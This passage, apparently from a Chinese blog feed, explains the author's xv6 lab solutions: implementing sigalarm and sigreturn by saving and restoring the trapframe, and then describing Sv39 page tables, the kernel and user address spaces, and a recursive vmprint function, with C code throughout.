title="执行handler"></a>执行handler</h4><p>根据之前博客分析的<strong>trap</strong>流程，其会在<strong>usertrapret</strong>(kernel/trap.c)中，设置<strong>sepc</strong>(Supervisor Exception Program Counter)，从而指定<strong>trap</strong>返回后，<strong>U-mode</strong>对应的第一条指令地址</p><p>在前面触发<strong>alarm</strong>时，将<strong>struct proc</strong>的<strong>trapframe</strong>字段的<strong>epc</strong>值设置为对应的<strong>handler</strong>，其会在<strong>usertrapret</strong>(kernel/trap.c)中赋值给<strong>sepc</strong>，从而完成<strong>trap</strong>返回后执行<strong>handler</strong></p><p>需要注意的是，为了确保之后可以恢复到触发<strong>alarm</strong>前的<strong>U-mode</strong>的上下文，自然需要保存该<strong>sepc</strong>原始值以及其他信息，在下面部分进行介绍</p><h4 id="返回触发alarm上下文"><a href="#返回触发alarm上下文" class="headerlink" title="返回触发alarm上下文"></a>返回触发alarm上下文</h4><p>根据前面的分析，为了在触发<strong>alarm</strong>并执行完<strong>handler</strong>后，仍然能恢复触发前的执行状态，内核需要保存相关的数据——即<strong>struct proc</strong>的<strong>trapframe</strong>数据</p><p>在执行完<strong>handler</strong>后，<strong>sigreturn</strong>系统调用保存的<strong>trapframe</strong>和触发<strong>alarm</strong>时的<strong>trapframe</strong>很可能完全不一致。因此需要在前面执行<strong>handler</strong>前，备份<strong>struct proc</strong>的<strong>trapframe</strong>数据。</p><p>而由于xv6的精巧设计，<strong>trapframe</strong>中包含触发<strong>alarm</strong>前的程序上下文，和触发<strong>alarm</strong>对应的<strong>epc</strong>。从而在<strong>sigreturn</strong>系统调用中恢复之前保存的<strong>trapframe</strong>，即可在从<strong>trap</strong>退出后，恢复到触发<strong>alarm</strong>前的状态</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>首先，在<strong>kernel/proc.h</strong>中更改<strong>struct proc</strong>的结构体，添加记录<strong>alarm</strong>信息和保存<strong>trapframe</strong>数据的字段<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line">  <span class="type">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="type">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="type">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="type">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">tf_bak</span>;</span>     <span class="comment">// store the frame when invoke the alarm handler</span></span><br><span class="line">                               <span class="comment">// restore the frame when invoke sigreturn</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">  alarm alarm;                 <span class="comment">// Process&#x27;s alarm</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/syssig.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uint64 fn;                  <span class="comment">// user-defined callback function</span></span><br><span class="line">    <span class="type">int</span> time;                   <span class="comment">// tick remained for alarms</span></span><br><span class="line">    <span class="type">int</span> interval;               <span class="comment">// alarm interval tick.</span></span><br><span class="line">    <span class="type">int</span> status;                 <span class="comment">// the alarm struct&#x27;s status</span></span><br><span class="line">&#125; alarm;</span><br></pre></td></tr></table></figure></p><p>接着，实现<strong>sysalarm</strong>系统调用，从而添加<strong>alarm</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syssig.c</span></span><br><span class="line"><span class="comment">// add an alarm</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p == <span class="number">0</span> || p-&gt;alarm.status != ALARM_UNUSE)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> interval;</span><br><span class="line">  uint64 fn;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;interval) &lt; <span class="number">0</span> || argaddr(<span class="number">1</span>, &amp;fn) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// handle corner case</span></span><br><span class="line">  <span class="keyword">if</span>(interval &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(interval == <span class="number">0</span> &amp;&amp; fn == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  p-&gt;alarm.status = ALARM_WAIT;</span><br><span class="line">  p-&gt;alarm.fn = fn;</span><br><span class="line">  p-&gt;alarm.interval = interval;</span><br><span class="line">  p-&gt;alarm.time = interval;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面完成<strong>alarm</strong>的更新和触发，即在<strong>timer interrupt</strong>时更新并判断<strong>alarm</strong>。当<strong>alarm</strong>需要被触发时，则保存当前的<strong>trapframe</strong>，并更改<strong>epc</strong>字段即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syssig.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">handle_alarm</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;alarm.status != ALARM_WAIT)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(p-&gt;alarm.time &gt; <span class="number">0</span>)</span><br><span class="line">    --p-&gt;alarm.time;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;alarm.time == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// it is time to invoke the alarm handler</span></span><br><span class="line">    p-&gt;alarm.status = ALARM_HANDLE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// store the U-mode trapframe</span></span><br><span class="line">    memmove(&amp;p-&gt;tf_bak, p-&gt;trapframe, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// it should execute the fn callback, when from the trap </span></span><br><span class="line">    p-&gt;trapframe-&gt;epc = p-&gt;alarm.fn;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/trap.c</span></span><br><span class="line"><span class="comment">// check if it&#x27;s an external interrupt or software interrupt,</span></span><br><span class="line"><span class="comment">// and handle it.</span></span><br><span class="line"><span class="comment">// returns 2 if timer interrupt,</span></span><br><span class="line"><span class="comment">// 1 if other device,</span></span><br><span class="line"><span class="comment">// 0 if not recognized.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">devintr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(scause == <span class="number">0x8000000000000001</span>L)&#123;</span><br><span class="line">    <span class="comment">// software interrupt from a machine-mode timer interrupt,</span></span><br><span class="line">    <span class="comment">// forwarded by timervec in kernelvec.S.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">      clockintr();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// acknowledge the software interrupt by clearing</span></span><br><span class="line">    <span class="comment">// the SSIP bit in sip.</span></span><br><span class="line">    w_sip(r_sip() &amp; ~<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// handle the alarm</span></span><br><span class="line">    handle_alarm();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后，则是实现<strong>sigreturn</strong>系统调用，恢复保存的<strong>trapframe</strong>，从<strong>handler</strong>中返回到触发<strong>alarm</strong>前的状态<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syssig.c</span></span><br><span class="line"><span class="comment">// it was in the signal handler</span></span><br><span class="line"><span class="comment">// yet its origin context is saved</span></span><br><span class="line"><span class="comment">// so just restore to origin context</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p == <span class="number">0</span> || p-&gt;alarm.status != ALARM_HANDLE)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  p-&gt;alarm.status = ALARM_WAIT;</span><br><span class="line">  p-&gt;alarm.time = p-&gt;alarm.interval;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// store the U-mode trapframe</span></span><br><span class="line">  memmove(p-&gt;trapframe, &amp;p-&gt;tf_bak, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;alarmtest&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="alarmtest实验结果.png" alt="alarmtest实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-三</title>
      <link href="/2022/05/26/xv6-%E4%B8%89/"/>
      <url>/2022/05/26/xv6-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客探索一下xv6内核的虚拟内存机制</p><h1 id="xv6的页表机制"><a href="#xv6的页表机制" class="headerlink" title="xv6的页表机制"></a>xv6的页表机制</h1><p><strong>page table</strong>(页表)是典型的软、硬件结合的机制，即硬件提供相关的电路实现和接口，操作系统根据硬件的接口，实现相关的服务</p><h2 id="页表硬件"><a href="#页表硬件" class="headerlink" title="页表硬件"></a>页表硬件</h2><p>对于<strong>riscv</strong>指令来说(无论在<strong>S-mode</strong>还是<strong>U-mode</strong>)，其操作的是<strong>virtual address</strong>(虚拟地址)。但是对于机器的<strong>RAM</strong>来说，其操作的是<strong>physical address</strong>(物理地址)</p><p>而<strong>page table</strong>的硬件部分，则是连接两个地址的组件——其将<strong>virtual address</strong>(虚拟地址)映射为<strong>physical address</strong>(物理地址)</p><p><strong>page table</strong>工作的基本逻辑如下图所示<br><img src="page-table工作示意图.png" alt="page table工作示意图"></p><p>直白的说，其将<strong>虚拟地址空间</strong>和<strong>物理地址空间</strong>以<strong>页</strong>(4096字节)为单位切分，并以<strong>页</strong>为单位进行映射(即通过<strong>page table</strong>记录页号之间的映射关系)</p><p>当然，<strong>riscv</strong>支持多种<strong>page table</strong>机制，但是这些机制的大体思路和上面的图所展示的是一致的</p><p>xv6采用了<strong>Sv39</strong>方案的<strong>page table</strong>，即support a 39-bit virtual address space。该方案中，64bit的<strong>virtual address</strong>仅仅使用低39bit，如下所示<br><img src="sv39-virtual-address.png" alt="Sv39 virtual address示意图"></p><p><strong>Sv39</strong>方案中的<strong>虚拟地址</strong>和<strong>物理地址</strong>的映射略微复杂一些，但基本原理和前面是一致的，即以<strong>页</strong>为单位进行映射，如下所示<br><img src="sv39地址映射示意图.png" alt="Sv39地址映射示意图"></p><p><strong>Sv39</strong>方案中的<strong>page table</strong>可以抽象成三层树。每一层树都是<strong>页</strong>(4096字节)大小的，包含<strong>512</strong>个<strong>PTE</strong>(page table entries)的<strong>pd</strong>(page directory)。<strong>pte</strong>(page table entries)是一个<strong>8字节</strong>大小的，包含其指向的<strong>物理页</strong>的序号和属性的元素。</p><p>未开启<strong>page table</strong>之前，所有指令访问的内存数据都是<strong>physical address</strong><br>而如果准备使用<strong>page table</strong>机制，只需要首先在物理内存中初始化好页表(即填充每级<strong>pd</strong>的<strong>pte</strong>元素)，并将<strong>page table</strong>的根<strong>pd</strong>的物理地址装载入<strong>satp</strong>(Supervisor Address Translation and Protection)寄存器即可。之后任何指令访问的内存数据，都是需要经过<strong>page table</strong>映射处理的<strong>virtual address</strong></p><h2 id="内核抽象"><a href="#内核抽象" class="headerlink" title="内核抽象"></a>内核抽象</h2><p><strong>page table</strong>在内核中抽象出的对象即为<strong>address space</strong><br>正如前面分析过的，<strong>内核地址空间</strong>(即<strong>S-mode</strong>)和<strong>用户地址空间</strong>(即<strong>U-mode</strong>)中，相同的<strong>virtual address</strong>，往往映射到不同的<strong>physical address</strong>，也就是访问内存往往不一致</p><h3 id="内核地址空间"><a href="#内核地址空间" class="headerlink" title="内核地址空间"></a>内核地址空间</h3><p>xv6包含单个<strong>内核页表</strong>，即仅仅含有一个<strong>内核地址空间</strong></p><p>为了在<strong>内核地址空间</strong>中，可以高效、方便的管理硬件、物理内存等资源，xv6精心构建如下所示的<strong>内核地址空间</strong>映射关系<br><img src="内核地址空间示意图.png" alt="内核地址空间示意图"></p><p>可以看到，<strong>内核地址空间</strong>大致分为如下几个区域</p><ol><li><p>$[0, KERNBASE(0x80000000))$<br><strong>QEMU</strong>会将I/O设备接口映射到低0x80000000内存处<br>内核为了方便进行管理，自然采用最简单直接的映射方式——直接映射，也就是将这部分的<strong>virtual address</strong>映射到相同值的<strong>physical address</strong>，从而降低管理的心智负担(kernel/vm.c:28)</p></li><li><p>$[KERNBASE(0x80000000), PHYSTOP(0x86400000))$<br>这部分是实际上剩余可用的物理内存，则为了方便内核管理内存资源，自然类似于上面，采用最简单直接的映射方式——直接映射，也就是将这部分的<strong>virtual address</strong>映射到相同值的<strong>physical address</strong>，从而降低管理的心智负担。(kernel/vm.c:40)</p><p>这里额外说明一下，xv6的内核镜像也被加载到这部分<strong>physical address</strong>，也就是<strong>virtual address</strong>处。由于是直接映射，则内核代码中的访存指令可以正常运行</p></li><li><p>$[MAXVA(0x4000000000) - 0x1000, MAXVA(0x4000000000))$<br>正如前面博客介绍过的，这部分静态的映射<strong>trap</strong>过程的汇编处理部分(kernel/vm.c:47)，并且后面要介绍的用户态空间，这部分<strong>virtual address</strong>同样映射到相同的<strong>physical address</strong>处</p></li><li><p>$[PHYSTOP(0x86400000), MAXVA(0x4000000000) - 0x1000)$<br>这部分是每个进程的内核栈页。每个CPU的第一个进程的内核栈是静态映射到内核镜像相关数据加载的<strong>physical address</strong>(kernel/entry.S:11)；对于其余进程的内核栈，则动态申请内核管理的物理内存资源并进行映射(kernel/proc.c:37)</p></li></ol><p>再直白一些，对于<strong>内核地址空间</strong>的<strong>virtual address</strong>，基本上<strong>直接映射</strong>到<strong>physical address</strong>，从而方便内核进行资源管理——通过访问与<strong>physical address</strong>相同值的<strong>virtual address</strong>，就可以直接访问到相应的<strong>physical address</strong>，真正的<strong>make life easier</strong></p><h3 id="用户地址空间"><a href="#用户地址空间" class="headerlink" title="用户地址空间"></a>用户地址空间</h3><p>xv6中每个进程拥有一个单独的<strong>page table</strong>，从而完成进程间以及进程和内核间的隔离</p><p>xv6构建的<strong>用户地址空间</strong>布局如下所示<br><img src="用户地址空间示意图.png" alt="用户地址空间示意图"></p><p>除了<strong>trampoline</strong>部分，其余的<strong>virtual address</strong>都是动态映射到<strong>physical address</strong>中——即申请对应的物理页，并在页表中添加映射<br>而对于<strong>trampoline</strong>，这部分前面也介绍了，将其静态映射到内核镜像对应代码的装载的物理地址即可</p><p>这里还想额外说一下。由于<strong>内核地址空间</strong>是<strong>直接映射</strong>，则在内核地址空间中，通过<strong>virtual address</strong>，可以轻易访问到物理页，也就是可以轻松访问到用户进程的<strong>页表</strong>，从而更改进程的<strong>用户地址空间</strong>信息，而这也是很多系统调用的实现原理(例如exec，直接重新初始化用户页表，从而初始化用户地址空间)</p><h1 id="Lab-page-tables"><a href="#Lab-page-tables" class="headerlink" title="Lab page tables"></a>Lab page tables</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/pgtbl.html">lab</a>帮助熟悉<strong>xv6</strong>的页表</p><h2 id="print-a-page-table"><a href="#print-a-page-table" class="headerlink" title="print a page table"></a>print a page table</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Define a function called <strong>vmprint()</strong>. It should take a <strong>pagetable_t</strong> argument, and print that pagetable in the format described below. Insert <strong>if(p-&gt;pid==1) vmprint(p-&gt;pagetable)</strong> in exec.c just before the <strong>return argc</strong>, to print the first process’s page table. You receive full credit for this assignment if you pass the <strong>pte printout</strong> test of <strong>make grade</strong>.</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据前面分析，<strong>page table</strong>可以抽象为一个<strong>树</strong>，则可以尝试使用递归方法，递归的解析<strong>page table</strong></p><p>实际上，除了根页表外，每一个<strong>pd</strong>都是由<strong>512</strong>个<strong>pte</strong>组成的，其输出格式仅仅和<strong>pte</strong>的值和其<strong>pd</strong>层级有关，方便递归遍历的实现</p><p>这里需要提醒的是，则解析<strong>pte</strong>时，需要通过其<strong>PTE_V</strong>标志位，判断该<strong>pte</strong>是否有效</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>在<strong>kernel/exec.c</strong>文件中，实习递归解析的方法即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//kernel/exec.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">exec</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Commit to the user image.</span></span><br><span class="line">  oldpagetable = p-&gt;pagetable;</span><br><span class="line">  p-&gt;pagetable = pagetable;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  p-&gt;trapframe-&gt;epc = elf.entry;  <span class="comment">// initial program counter = main</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = sp; <span class="comment">// initial stack pointer</span></span><br><span class="line">  proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// print the first process&#x27;s page table</span></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;pid == <span class="number">1</span>)</span><br><span class="line">    vmprint(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// The risc-v Sv39 scheme has three levels of page-table</span></span><br><span class="line"><span class="comment">// pages. A page-table page contains 512 64-bit PTEs.</span></span><br><span class="line"><span class="comment">// A 64-bit virtual address is split into five fields:</span></span><br><span class="line"><span class="comment">//   39..63 -- must be zero.</span></span><br><span class="line"><span class="comment">//   30..38 -- 9 bits of level-2 index.</span></span><br><span class="line"><span class="comment">//   21..29 -- 9 bits of level-1 index.</span></span><br><span class="line"><span class="comment">//   12..20 -- 9 bits of level-0 index.</span></span><br><span class="line"><span class="comment">//    0..11 -- 12 bits of byte offset within the page.</span></span><br><span class="line"><span class="comment">// recursively walk the page-table by _vmprint</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_vmprint(<span class="type">pagetable_t</span> pagetable, <span class="type">int</span> level)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> pte_no = <span class="number">0</span>; pte_no &lt; <span class="number">512</span>; ++pte_no) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">pte_t</span> *pte = &amp;pagetable[pte_no];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if pte is invalid, just ignore the following parse</span></span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parse the pte</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// print the indent</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span> - level; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// print the index, content and physical address</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: pte %p pa %p\n&quot;</span>, pte_no, *pte, PTE2PA(*pte));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// recursively walk the next level, if next level is valid</span></span><br><span class="line">    <span class="keyword">if</span>(level)</span><br><span class="line">      _vmprint((<span class="type">pagetable_t</span>)PTE2PA(*pte), level - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// print the page table content for given page table</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>, pagetable);</span><br><span class="line"> 